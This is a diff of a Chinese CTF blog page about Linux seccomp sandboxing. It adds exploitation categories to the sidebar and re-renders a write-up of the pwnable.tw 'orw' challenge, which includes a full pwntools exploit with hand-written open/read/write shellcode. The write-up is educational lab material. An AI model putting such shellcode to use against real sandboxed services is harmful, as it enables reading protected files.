@@ -78,9 +78,33 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/heap/" class="animsition-link">heap<small>(1)</small></a></li>
+				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
-				    <li><a href="/categories/stack/" class="animsition-link">stack<small>(1)</small></a></li>
+				    <li><a href="/categories/Heap-Fastbin-Attack/" class="animsition-link">Heap - Fastbin Attack<small>(6)</small></a></li>
+				    
+				    <li><a href="/categories/Heap-Off-By-One/" class="animsition-link">Heap - Off By One<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Heap-Tcache/" class="animsition-link">Heap - Tcache<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(17)</small></a></li>
+				    
+				    <li><a href="/categories/OTHER-IO-FILE/" class="animsition-link">OTHER - IO FILE<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Pwn-college/" class="animsition-link">Pwn.college<small>(9)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-DynELF/" class="animsition-link">STACK - DynELF<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Format/" class="animsition-link">STACK - Format<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ROP/" class="animsition-link">STACK - ROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-SROP/" class="animsition-link">STACK - SROP<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-Stack-Overflow/" class="animsition-link">STACK - Stack Overflow<small>(4)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-ret2dlsolve/" class="animsition-link">STACK - ret2dlsolve<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/STACK-sandbox/" class="animsition-link">STACK - sandbox<small>(1)</small></a></li>
 				    
 				</ul>
         	</li>
@@ -183,24 +207,21 @@
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<html><head></head><body><h3 id=""><a class="post-anchor" href="#"></a></h3><h2 id="1）Seccomp基础">1）Seccomp基础<a class="post-anchor" href="#1）Seccomp基础"></a></h2><h3 id="Seccomp简介">Seccomp简介<a class="post-anchor" href="#Seccomp简介"></a></h3><p>​        就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。</p>
-<h3 id="启动Seccomp">启动Seccomp<a class="post-anchor" href="#启动Seccomp"></a></h3><p>​        如果要编写调用Seccomp的程序，需要先安装相应的头文件。</p>
-<pre><code class="bash">apt install libseccomp-dev libseccomp2 seccomp
-</code></pre>
+      		<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="1）Seccomp基础"><a href="#1）Seccomp基础" class="headerlink" title="1）Seccomp基础"></a>1）Seccomp基础</h2><h3 id="Seccomp简介"><a href="#Seccomp简介" class="headerlink" title="Seccomp简介"></a>Seccomp简介</h3><p>​        就像ALSR，NX这样，Seccomp也是linux内核的一种安全机制。这种保护机制会禁用某些系统调用，有效避免了越权行为的发生。</p>
+<h3 id="启动Seccomp"><a href="#启动Seccomp" class="headerlink" title="启动Seccomp"></a>启动Seccomp</h3><p>​        如果要编写调用Seccomp的程序，需要先安装相应的头文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libseccomp-dev libseccomp2 seccomp</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <p>Seccomp的模式以及参数比较多，这里只总结比较直观的几点，具体的可以看大佬的博客：<a target="_blank" rel="noopener" href="https://a1ex.online/2020/09/27/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">seccomp学习笔记</a></p>
-<pre><code class="c">    scmp_filter_ctx ctx;
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line"></span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_ALLOW);<span class="comment">/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/</span></span><br><span class="line"></span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line"><span class="comment">//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数）</span></span><br><span class="line">	</span><br><span class="line">seccomp_load(ctx);<span class="comment">//调用，使过滤规则生效</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-    ctx = seccomp_init(SCMP_ACT_ALLOW);/* SCMP_ACT_ALLOW表示在初始化的时候允许所有系统调用，相反的 SCMP_ACT_KILL表示禁用所有系统调用*/
-
-    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
-//添加一条seccomp规则，第二个参数选择禁用/开启（kill为禁用，allow为开启）第三个参数表示规则处理的具体的系统调用，第四个参数是限制系统调用执行的参数，如果不为0，那么后面会加上更具体的限制系统调用参数的函数参数）
-    
-seccomp_load(ctx);//调用，使过滤规则生效
-</code></pre>
-<h2 id="2）Seccomp-Tools">2）Seccomp-Tools<a class="post-anchor" href="#2）Seccomp-Tools"></a></h2><p>​        暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。</p>
-<h2 id="3）ORW例题">3）ORW例题<a class="post-anchor" href="#3）ORW例题"></a></h2><h3 id="pwnable-orw">pwnable-orw<a class="post-anchor" href="#pwnable-orw"></a></h3><p>​        pwnable第二题，orw。 </p>
+<h2 id="2）Seccomp-Tools"><a href="#2）Seccomp-Tools" class="headerlink" title="2）Seccomp-Tools"></a>2）Seccomp-Tools</h2><p>​        暂时空着，因为我seccomp dump，系统给我说无权限。这个问题似乎仅限于docker，但是网上并没有类似的烈士为我答疑解惑捏。</p>
+<h2 id="3）ORW例题"><a href="#3）ORW例题" class="headerlink" title="3）ORW例题"></a>3）ORW例题</h2><h3 id="pwnable-orw"><a href="#pwnable-orw" class="headerlink" title="pwnable-orw"></a>pwnable-orw</h3><p>​        pwnable第二题，orw。 </p>
 <p>​    </p>
-<p>​                <a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png" data-caption="截屏2021-11-15 下午9.41.28" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png" alt="截屏2021-11-15 下午9.41.28"></a></p>
+<p>​                <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-15%20%E4%B8%8B%E5%8D%889.41.28.png" alt="截屏2021-11-15 下午9.41.28"></p>
 <p>​        这里的沙箱实际是通过prctl来控制实现的。</p>
 <blockquote>
 <p>(1).PR_SET_SECCOMP(22)：当第一个参数是PR_SET_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock_fprog结构体定义，该结构体成员指向的sock_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图)</p>
@@ -209,47 +230,30 @@ seccomp_load(ctx);//调用，使过滤规则生效
 </blockquote>
 <p>​        所以这道题就是一道没有任何坑的orw，我们需要做的就是手写shellcode。</p>
 <p>​        参照我之前qwb那道orw的wp，为了读取到flag，我们的步骤如下</p>
-<pre><code class="c">sys_open("flag")//读取flag
-sys_read("eax","esp",0x40)//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下
-sys_write(1,"esp",0x40)//打印flag的值到屏幕输出
-</code></pre>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sys_open(<span class="string">&quot;flag&quot;</span>)<span class="comment">//读取flag</span></span><br><span class="line">sys_read(<span class="string">&quot;eax&quot;</span>,<span class="string">&quot;esp&quot;</span>,<span class="number">0x40</span>)<span class="comment">//eax为sys_oopen的返回值，也就是flag，然后将flag写到esp下</span></span><br><span class="line">sys_write(<span class="number">1</span>,<span class="string">&quot;esp&quot;</span>,<span class="number">0x40</span>)<span class="comment">//打印flag的值到屏幕输出</span></span><br></pre></td></tr></table></figure>
+
+
+
 <p>​        如果要达到可以成功执行的效果，就必须要像写完整汇编一样将所有压栈出栈等对栈顶的操作也考虑进去。</p>
 <p>​        手写汇编要尤其注意32位与64位系统传参规则并不相同。尤其是函数使用的寄存器的种类理论上是特定的，如果搞错就直接EOF了。</p>
 <p>​        并且进行软中断时使用的指令是<code>int 0x80</code>而不是<code>syscall</code>，<code>syscall</code>是c语言层面上的系统调用，而<code>int 0x80</code>才是汇编层面的系统调用。</p>
 <p>​        关于pwntools的asm模块，有一些比较怪的点。</p>
 <p>​        比如说我们可以这样写：</p>
-<pre><code class="python">payload =  asm("push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;")
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload =  asm(<span class="string">&quot;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebp, esp;mov eax, 0x5;xor ecx, ecx;xor edx, edx;int 0x80;&quot;</span>)</span><br><span class="line"></span><br><span class="line">也可以这样写</span><br></pre></td></tr></table></figure>
 
-也可以这样写
-</code></pre>
-<pre><code class="python">asm('mov eax, 0')
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
 <p>​        就是说，可以有分号，也可以没有。</p>
-<pre><code class="python">from pwn import*
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context.update(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">payload =  asm(<span class="string">&quot;push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;&quot;</span>)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">payload += asm(<span class="string">&quot;mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;&quot;</span>)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">payload += asm(<span class="string">&quot;mov eax, 0x4;mov ebx, 0x1;int 0x80;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-#p = process("./orw")
-#context.terminal = ['tmux', 'splitw', '-h']
-#context.update(arch='i386', os='linux')
 
-p = remote("chall.pwnable.tw",10001)
-#context.log_level = "debug"
 
-#open
-payload =  asm("push ebx ;push 0x67616c66;push 0x2f77726f;push 0x2f656d6f;push 0x682f2f2f;mov ebx, esp;mov eax, 0x5;int 0x80;")
-#read
-payload += asm("mov eax, 0x3; mov ecx, ebx; mov ebx, eax;mov edx, 0x60;int 0x80;")
-#write
-payload += asm("mov eax, 0x4;mov ebx, 0x1;int 0x80;")
-
-#gdb.attach(p)
-p.sendline(payload)
-
-p.interactive()
-</code></pre>
 <p>​        完整exp，其实主要是要对32位的传参熟悉，整体编写的难度并不高捏。</p>
-<p><a target="_blank" rel="noopener" href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png" data-caption="截屏2021-11-17 下午10.28.54" data-fancybox="images"><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png" alt="截屏2021-11-17 下午10.28.54"></a>        </p>
-<h2 id="4）参考">4）参考<a class="post-anchor" href="#4）参考"></a></h2><p>prctl函数开始学习沙箱规则](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/12839171.html">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</a>)</p>
-</body></html>
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-17%20%E4%B8%8B%E5%8D%8810.28.54.png" alt="截屏2021-11-17 下午10.28.54">        </p>
+<h2 id="4）参考"><a href="#4）参考" class="headerlink" title="4）参考"></a>4）参考</h2><p>prctl函数开始学习沙箱规则](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/12839171.html">https://www.cnblogs.com/L0g4n-blog/p/12839171.html</a>)</p>
+
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
